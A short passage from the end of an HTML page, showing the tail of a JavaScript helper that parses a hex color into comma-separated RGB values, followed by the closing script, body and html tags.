        var g = parseInt(hex.slice(3,5),16);
        var b = parseInt(hex.slice(5,7),16);
        return r+','+g+','+b;
    }
    </script>
</body>
</html>
